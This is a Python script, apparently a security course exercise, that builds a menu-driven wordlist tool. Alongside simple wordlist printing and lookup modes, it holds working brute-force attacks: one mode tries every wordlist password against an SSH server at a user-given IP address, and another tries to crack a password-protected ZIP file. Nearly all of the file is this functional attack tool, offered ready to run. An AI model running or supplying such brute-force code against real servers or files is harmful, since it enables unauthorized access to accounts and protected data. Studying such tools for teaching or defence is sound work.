#!/usr/bin/env python3

# Rodolfo Gonzalez
# January 31 2024

# Purpose: Challenge 16: Automate Brute Force Wordlis Attack Tool 3 of 3

import time
import paramiko
import zipfile
import re

####################################
# Helper Function for IP Validation
####################################
def is_valid_ip(ip):
    """Check if the provided string is a valid IP address."""
    return re.match(r'^\d{1,3}(\.\d{1,3}){3}$', ip)

####################################
# Mode 1: Offensive; Dictionary Iterator
####################################
def offensive_mode():
    """Print words from a file with a delay."""
    file_path = input("Enter the path of the wordlist file: ")
    delay = float(input("Enter the delay between words (in seconds): "))
    max_lines = int(input("Enter the maximum number of lines to display: "))

    line_count = 0
    try:
        with open(file_path, 'r') as file:
            for word in file:
                word = word.strip()
                if not word:
                    break
                print(word)
                line_count += 1
                if line_count >= max_lines:
                    break
                time.sleep(delay)
    except FileNotFoundError:
        print("File not found.")

####################################
# Mode 2: Defensive; Password Recognized
####################################
def defensive_mode(file_path, user_input):
    """Check if a word exists in a file."""
    try:
        with open(file_path, 'r', errors='ignore') as file:
            for word in file:
                if user_input == word.strip():
                    print("The word is in the word list.")
                    return
            print("The word is not in the word list.")
    except FileNotFoundError:
        print("File not found.")

####################################
# Mode 3: SSH Brute Force
####################################
def ssh_brute_force(file_path, ip_address, username, delay):
    """Attempt to brute force an SSH login."""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        with open(file_path, 'r') as file:
            for word in file:
                password = word.strip()
                print(f"Trying password: {password}")
                try:
                    ssh.connect(ip_address, username=username, password=password)
                    print(f"Login successful for password: {password}")
                    return
                except paramiko.AuthenticationException:
                    print("Authentication failed. Trying next password.")
                except paramiko.SSHException as e:
                    print(f"SSH error: {e}")
                    break
                time.sleep(delay)
    except FileNotFoundError:
        print("File not found.")
    finally:
        ssh.close()  # Ensure the SSH client is closed even if an error occurs

####################################
# Mode 4: ZIP Brute Force Attack
####################################
def zip_brute_force(file_path, zip_file_path):
    """Attempt to brute force a ZIP file password."""
    try:
        with zipfile.ZipFile(zip_file_path, 'r') as zf:
            with open(file_path, 'r') as file:
                for word in file:
                    password = word.strip()
                    print(f"Trying password: {password}")
                    try:
                        zf.extractall(pwd=bytes(password, 'utf-8'))
                        print(f"Password found: {password}")
                        return password
                    except RuntimeError as e:
                        if 'Bad password' in str(e):
                            pass  # Incorrect password, move to the next
                        else:
                            print(f"Runtime error: {e}")
                            break
    except FileNotFoundError:
        print(f"File not found. Please check the path and try again: {zip_file_path}")
    except zipfile.BadZipFile:
        print(f"Bad zip file or format not supported: {zip_file_path}")

####################################
# Main Menu
####################################
def main_menu():
    while True:
        print("\n\033[95mSelect a mode:\033[0m")
        print("1 for Offensive")
        print("2 for Defensive")
        print("3 for SSH Brute Force")
        print("4 for ZIP Brute Force")
        print("5 to Exit")
        mode = input("\033[95mEnter your choice: \033[0m")

        if mode == '1':
            offensive_mode()
        elif mode == '2':
            file_path = input("Enter the path of the wordlist file: ")
            user_input = input("Enter a word to search: ")
            defensive_mode(file_path, user_input)
        elif mode == '3':
            file_path = input("Enter the path of the wordlist file: ")
            ip_address = input("Enter the IP address of the SSH server: ")
            if not is_valid_ip(ip_address):
                print("Invalid IP address format.")
                continue
            username = input("Enter the SSH username: ")
            ssh_delay = float(input("Enter the delay between SSH attempts (in seconds): "))
            ssh_brute_force(file_path, ip_address, username, ssh_delay)
        elif mode == '4':
            file_path = input("Enter the path of the wordlist file: ")
            zip_file_path = input("Enter the path of the ZIP file: ")
            zip_brute_force(file_path, zip_file_path)
        elif mode == '5':
            print("Exiting the script.")
            break
        else:
            print("Invalid mode selected. Please try again.")

if __name__ == "__main__":
    main_menu()  # Start the main menu
